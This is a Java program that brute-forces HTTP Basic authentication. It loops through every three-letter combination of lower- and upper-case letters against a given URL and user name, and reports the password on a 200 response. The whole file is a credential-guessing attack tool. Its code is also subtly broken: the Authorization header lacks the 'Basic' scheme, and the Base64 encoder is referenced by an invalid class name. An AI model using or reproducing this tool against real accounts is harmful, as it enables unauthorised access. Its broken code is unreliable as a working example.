



import java.net.*;
import java.io.*;
import java.util.Date;

public class BruteForce {
  private URL url;
  private HttpURLConnection connection;
  private static String[] lowerCase = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
                                       "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
                                       "u", "v", "w", "x", "y", "z"};
  private static String[] upperCase = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J",
                                       "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T",
                                       "U", "V", "W", "X", "Y", "Z"};
  private String userPassword, base64_userPassword;
  private static char wrongPass;

  public BruteForce() {
    wrongPass = 'Y';
  }

  public char determinePass(String inputURL, String userName, String passWord){

    try{
        url = new URL(inputURL);
        connection = (HttpURLConnection)url.openConnection();
        this.getEncoded(userName, passWord);
        connection.setDoInput(true);
        connection.setDoOutput(false);
        connection.setRequestProperty("Authorization",
                                      " " + base64_userPassword);

        if  (connection.getResponseCode() == 200)
        {
          System.out.println("Success!! Password is: " + passWord);
          wrongPass = 'N';
        }

        return wrongPass;
    }
    catch (MalformedURLException e){System.out.println("Invalide url");}
    catch (IOException e){System.out.println("Error  URL");
                          wrongPass = 'Y';}
    return wrongPass;
  }

  public static void main(String[] args) {
    int i, j, k;
    String brutePass;

    BruteForce bruteForce1 = new BruteForce();

    Date date = new Date(System.currentTimeMillis());
    System.out.print(" time is: ");
    System.out.println(date.toString());
    
    
    

    
    for  (i = 0; i < 26; i++)
    { for  (j = 0; j < 26; j++)
      { for  (k = 0; k < 26; k++)
        {
           brutePass = lowerCase[i] + lowerCase[j] + lowerCase[k];
           bruteForce1.determinePass(args[0], args[1], brutePass);
           if  (wrongPass == 'N')
           { i = 26;
             j = 26;
             k = 26;
           }}}}

     if  (wrongPass == 'N')
     {
       date.setTime(System.currentTimeMillis());
       System.out.print("End time is: ");
       System.out.println(date.toString());
       System.exit(0);
     }


    
    for  (i = 0; i < 26; i++)
    { for  (j = 0; j < 26; j++)
      { for  (k = 0; k < 26; k++)
        {
           brutePass = upperCase[i] + upperCase[j] + upperCase[k];
           bruteForce1.determinePass(args[0], args[1], brutePass);
           if  (wrongPass == 'N')
           { i = 26;
             j = 26;
             k = 26;
           }}}}

    if  (wrongPass == 'N')
    {
      date.setTime(System.currentTimeMillis());
      System.out.print("End time is: ");
      System.out.println(date.toString());
      System.exit(0);
    }

    
    for  (i = 0; i < 26; i++)
    { for  (j = 0; j < 26; j++)
      { for  (k = 0; k < 26; k++)
        {
           brutePass = upperCase[i] + upperCase[j] + lowerCase[k];
           bruteForce1.determinePass(args[0], args[1], brutePass);
           if  (wrongPass == 'N')
           { i = 26;
             j = 26;
             k = 26;
           }}}}

    if  (wrongPass == 'N')
    {
      date.setTime(System.currentTimeMillis());
      System.out.print("End time is: ");
      System.out.println(date.toString());
      System.exit(0);
    }

    
    for  (i = 0; i < 26; i++)
    { for  (j = 0; j < 26; j++)
      { for  (k = 0; k < 26; k++)
        {
           brutePass = upperCase[i] + lowerCase[j] + upperCase[k];
           bruteForce1.determinePass(args[0], args[1], brutePass);
           if  (wrongPass == 'N')
           { i = 26;
             j = 26;
             k = 26;
           }}}}

    if  (wrongPass == 'N')
    {
      date.setTime(System.currentTimeMillis());
      System.out.print("End time is: ");
      System.out.println(date.toString());
      System.exit(0);
    }

    
    for  (i = 0; i < 26; i++)
    { for  (j = 0; j < 26; j++)
      { for  (k = 0; k < 26; k++)
        {
           brutePass = upperCase[i] + lowerCase[j] + lowerCase[k];
           bruteForce1.determinePass(args[0], args[1], brutePass);
           if  (wrongPass == 'N')
           { i = 26;
             j = 26;
             k = 26;
           }}}}

    if  (wrongPass == 'N')
    {
      date.setTime(System.currentTimeMillis());
      System.out.print("End time is: ");
      System.out.println(date.toString());
      System.exit(0);
    }

    
    for  (i = 0; i < 26; i++)
    { for  (j = 0; j < 26; j++)
      { for  (k = 0; k < 26; k++)
        {
           brutePass = lowerCase[i] + upperCase[j] + upperCase[k];
           bruteForce1.determinePass(args[0], args[1], brutePass);
           if  (wrongPass == 'N')
           { i = 26;
             j = 26;
             k = 26;
           }}}}

    if  (wrongPass == 'N')
    {
      date.setTime(System.currentTimeMillis());
      System.out.print("End time is: ");
      System.out.println(date.toString());
      System.exit(0);
    }

    
    for  (i = 0; i < 26; i++)
    { for  (j = 0; j < 26; j++)
      { for  (k = 0; k < 26; k++)
        {
           brutePass = lowerCase[i] + upperCase[j] + lowerCase[k];
           bruteForce1.determinePass(args[0], args[1], brutePass);
           if  (wrongPass == 'N')
           { i = 26;
             j = 26;
             k = 26;
           }}}}

    if  (wrongPass == 'N')
    {
      date.setTime(System.currentTimeMillis());
      System.out.print("End time is: ");
      System.out.println(date.toString());
      System.exit(0);
    }

    
    for  (i = 0; i < 26; i++)
    { for  (j = 0; j < 26; j++)
      { for  (k = 0; k < 26; k++)
        {
           brutePass = lowerCase[i] + lowerCase[j] + upperCase[k];
           bruteForce1.determinePass(args[0], args[1], brutePass);
           if  (wrongPass == 'N')
           { i = 26;
             j = 26;
             k = 26;
           }}}}

    date.setTime(System.currentTimeMillis());
    System.out.print("End time is: ");
    System.out.println(date.toString());

  }

  private void getEncoded(String userName, String password){
    userPassword = userName + ":" + password;
    base64_userPassword = new url.misc.BASE64Encoder().encode(userPassword.getBytes());
  }

}
